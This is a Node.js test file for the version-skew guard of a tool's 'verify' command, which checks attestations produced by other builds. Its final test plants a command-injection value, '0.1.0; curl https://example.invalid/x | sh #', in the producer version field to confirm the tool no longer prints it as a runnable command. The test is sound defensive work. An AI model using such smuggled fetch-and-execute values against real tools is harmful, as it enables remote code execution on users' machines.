// The cross-version guard of `runward verify` (ADR-0055 layer 2, refined by ADR-0113 decision 4).
//
// The survival thesis says a repo re-checks its verdict months later, and months later the installed
// runward has moved. Until ADR-0113 the skew was advisory and "never moves the exit code": an honest
// attestation of 0.37.1 was answered "NOT verified", exit 1, by 0.46.0, the very exit of a forgery,
// because the two versions word `gateNonScope` differently (measured 2026-11-05). A verdict re-derives
// only under the logic that produced it, so another build is answered neither verified nor not
// verified: exit 2 (`version-skew`), the producer named, the command that re-derives with it, and this
// build's own reading as advisory. And the command is built from a field of the attestation, so it is
// printed only when that field reads as a version.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync, readFileSync, cpSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const CLI = join(ROOT, "dist", "cli.js");
const VERSION = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).version;

const REFERENCE = mkdtempSync(join(tmpdir(), "rw-skew-ref-"));
execFileSync(process.execPath, [CLI, "init", "--yes", "--example"], { cwd: REFERENCE, stdio: "pipe" });

function mission() {
  const dir = mkdtempSync(join(tmpdir(), "rw-skew-"));
  cpSync(REFERENCE, dir, { recursive: true });
  const att = join(dir, "verdict.intoto.json");
  writeFileSync(att, execFileSync(process.execPath, [CLI, "check", "--attest", "--strict", "-p", "."], { cwd: dir, encoding: "utf8" }));
  const edit = (f) => { const s = JSON.parse(readFileSync(att, "utf8")); f(s.predicate); writeFileSync(att, JSON.stringify(s, null, 2)); };
  return { dir, att, edit, drop: () => rmSync(dir, { recursive: true, force: true }) };
}
const verifyJson = (cwd, att) => {
  try { return { code: 0, out: JSON.parse(execFileSync(process.execPath, [CLI, "verify", att, "--json", "-p", "."], { cwd, encoding: "utf8" })) }; }
  catch (e) { return { code: e.status, out: JSON.parse(e.stdout) }; }
};
const verifyHuman = (cwd, att) => {
  try { return { code: 0, out: execFileSync(process.execPath, [CLI, "verify", att, "-p", "."], { cwd, encoding: "utf8" }) }; }
  catch (e) { return { code: e.status, out: (e.stdout ?? "") + (e.stderr ?? "") }; }
};

test("skew: the same build — the producer is this binary, and the attestation verifies", () => {
  const m = mission();
  try {
    const { code, out } = verifyJson(m.dir, m.att);
    assert.equal(code, 0);
    assert.equal(out.result, "verified");
    assert.equal(out.producedBy, VERSION, "the producing version is read from the predicate");
    assert.equal(out.versionSkew, false);
    assert.deepEqual(out.producer, out.verifier, "the attestation names the build that verifies it");
    assert.match(out.verifier.build, /^sha256:[a-f0-9]{64}$/);
    assert.equal(out.verifier.purl, `pkg:npm/runward@${VERSION}`, "what retrieves the producing binary");
  } finally { m.drop(); }
});

test("skew: another producer is answered neither verified nor not verified — exit 2 and the command that re-derives with it", () => {
  const m = mission();
  try {
    m.edit((p) => { p.runward = "0.37.1"; p.producer = { ...p.producer, version: "0.37.1", purl: "pkg:npm/runward@0.37.1", build: "sha256:" + "0".repeat(64) }; });
    const { code, out } = verifyJson(m.dir, m.att);
    assert.equal(code, 2, "a skew is the question this build cannot answer, never a 1");
    assert.equal(out.result, "version-skew");
    assert.equal(out.error, "version-skew", "the class of the exit 2 (ADR-0083)");
    assert.equal(out.verified, false);
    assert.equal(out.producedBy, "0.37.1");
    assert.equal(out.versionSkew, true);
    // The attestation path is quoted when it holds a character a shell would read (a Windows path).
    assert.match(out.rederive.command, /^npx --yes runward@0\.37\.1 verify \S.* -p \.$/, out.rederive.command);
    assert.equal(out.predicate.comparison, "advisory", "this build's reading is labelled, never decisive");
    const human = verifyHuman(m.dir, m.att);
    assert.equal(human.code, 2);
    assert.match(human.out, /not answered by this build — produced by runward 0\.37\.1/);
    assert.match(human.out, /npx --yes runward@0\.37\.1 verify/);
    assert.doesNotMatch(human.out, /NOT verified/, "an honest older attestation is never called a forgery");
  } finally { m.drop(); }
});

test("skew: one version, another build — a working copy numbered like a release is not that release", () => {
  const m = mission();
  try {
    m.edit((p) => { p.producer = { ...p.producer, build: "sha256:" + "1".repeat(64) }; });
    const { code, out } = verifyJson(m.dir, m.att);
    assert.equal(code, 2);
    assert.equal(out.result, "version-skew");
    assert.equal(out.producedBy, VERSION);
  } finally { m.drop(); }
});

test("skew: an attestation made before the producer was recorded is sent back to its version, and its honest fields read the same", () => {
  const m = mission();
  try {
    // The shape of every attestation made before ADR-0113: `runward` alone, and none of the fields an
    // older release did not emit. Advisory, under this build, on the keys it carries: nothing differs.
    m.edit((p) => {
      delete p.producer; p.runward = "0.43.1";
      delete p.ratification.byRow; delete p.gaps.causesByKind; delete p.prosePointers;
    });
    const { code, out } = verifyJson(m.dir, m.att);
    assert.equal(code, 2);
    assert.equal(out.result, "version-skew");
    assert.deepEqual(out.predicate.differing, [], JSON.stringify(out.predicate));
    assert.equal(out.producer.version, "0.43.1");
  } finally { m.drop(); }
});

test("skew: an attestation that names no producer at all is not an older one — compared under this build, it differs", () => {
  // Every runward since 0.35.0, the first with --attest, writes `runward`: its absence is a removal.
  const m = mission();
  try {
    m.edit((p) => { delete p.runward; delete p.producer; });
    const { code, out } = verifyJson(m.dir, m.att);
    assert.equal(code, 1);
    assert.equal(out.result, "differs");
    assert.equal(out.producedBy, null, "absent → null, never invented");
    assert.ok(out.predicate.differing.includes("runward") && out.predicate.differing.includes("producer"), JSON.stringify(out.predicate.differing));
  } finally { m.drop(); }
});

test("skew: a producer version that is not a version prints no command — the field comes from the attestation", () => {
  // Measured 2026-11-05 on 0.46.0: `"0.1.0; curl https://example.invalid/x | sh #"` printed
  // `npx runward@0.1.0; curl https://example.invalid/x | sh # verify b.json` as the gesture to run.
  const m = mission();
  try {
    const evil = "0.1.0; curl https://example.invalid/x | sh #";
    m.edit((p) => { p.runward = evil; p.producer = { ...p.producer, version: evil }; });
    const { code, out } = verifyJson(m.dir, m.att);
    assert.equal(code, 2);
    assert.equal(out.rederive.command, null);
    const human = verifyHuman(m.dir, m.att);
    assert.doesNotMatch(human.out, /npx[^\n]*curl/, "no command carries the attestation's text");
    assert.match(human.out, /does not read as a version, so no command is given/);
  } finally { m.drop(); }
});

process.on("exit", () => rmSync(REFERENCE, { recursive: true, force: true }));
